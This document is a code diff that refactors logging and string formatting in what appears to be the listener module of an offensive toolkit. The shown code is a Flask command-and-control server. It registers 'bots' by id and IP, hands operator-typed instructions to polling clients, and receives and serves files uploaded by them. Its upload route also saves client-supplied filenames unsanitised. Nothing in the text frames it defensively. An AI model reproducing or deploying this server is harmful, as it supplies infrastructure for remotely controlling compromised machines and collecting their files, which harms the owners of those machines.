@@ -45,7 +45,7 @@ def query():
 
     # Send request to bot if any pending
     clientId = request.form['id']
-    pendingInstruction = input(" %s >> " % clientId)
+    pendingInstruction = input(f" {clientId} >> ")
 
     return make_response(pendingInstruction)
 
@@ -56,7 +56,7 @@ def hello():
     # Add bot to network if necessary
     clientId = request.form['id']
     ip = request.remote_addr
-    logging.info("   [-] Hello from %s. - IP: %s" % (clientId, ip))
+    logging.info(f"   [-] Hello from {clientId}. - IP: {ip}")
     return make_response("OK")
 
 
@@ -78,11 +78,9 @@ webapp.config['UPLOAD_FOLDER'] = '.'
 @webapp.route('/u', methods=['POST'])
 @secure_http_response
 def upload():
-    # Get the name of the uploaded file
-    file = request.files['uploadfile']
-    if file:
+    if file := request.files['uploadfile']:
         filename = file.filename
-        logging.info("   [-] Uploaded: "+ filename)
+        logging.info(f"   [-] Uploaded: {filename}")
         file.save(os.path.join(webapp.config['UPLOAD_FOLDER'], filename))
         return make_response("OK")
 
@@ -92,7 +90,7 @@ def upload():
 def download(filename):
 
     uploads = webapp.config['UPLOAD_FOLDER']
-    logging.info("   [-] Sending file: %s" % (os.path.join(uploads,filename)))
+    logging.info(f"   [-] Sending file: {os.path.join(uploads, filename)}")
     return send_from_directory(directory=uploads, filename=filename)
 
 
@@ -113,7 +111,7 @@ class ListenServer(MpModule):
         log = logging.getLogger('werkzeug')
         log.setLevel(logging.ERROR) # Disable flask log if easier to debug
         logging.info ("   [-] Files in \"" + self.listenRoot + "\" folder are accessible using http://{ip}:{port}/u/".format(ip=getHostIp(), port=self.listenPort))
-        logging.info ("   [-] Listening on port %s (ctrl-c to exit)..." % self.listenPort)
+        logging.info(f"   [-] Listening on port {self.listenPort} (ctrl-c to exit)...")
 
         # Run web server in another thread
         webapp.run(
